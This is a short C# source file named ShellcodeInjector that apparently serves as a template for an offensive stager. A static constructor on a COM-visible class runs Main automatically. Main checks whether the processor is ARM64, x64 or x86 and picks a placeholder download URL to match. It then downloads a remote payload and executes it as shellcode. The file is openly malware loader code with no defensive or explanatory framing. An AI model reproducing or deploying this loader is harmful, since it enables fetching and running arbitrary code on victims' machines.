using System;
using System.Runtime.InteropServices;

namespace ShellcodeInjector
{
    [ComVisible(true)]
    public class Program
    {
        static Program()
        {
            Main();
        }

        static void Main()
        {
            SYSTEM_INFO sysInfo;
            NativeImports.GetNativeSystemInfo(out sysInfo);

            string url;
            ushort effectiveArch;

            if (sysInfo.wProcessorArchitecture == 12 && IntPtr.Size == 8)
            {
                // Native ARM64 process
                url = "%URLARM64%";
                effectiveArch = 12;
            }
            else if (IntPtr.Size == 8)
            {
                // x64 process (native or emulated on ARM64)
                url = "%URL64%";
                effectiveArch = 9;
            }
            else
            {
                // x86 process (native, WoW64, or emulated on ARM64)
                url = "%URL32%";
                effectiveArch = 0;
            }

            var payload = Downloader.DownloadFromUrl(url);
            ShellcodeRunner.RunPayload(payload, effectiveArch);
        }
    }
}
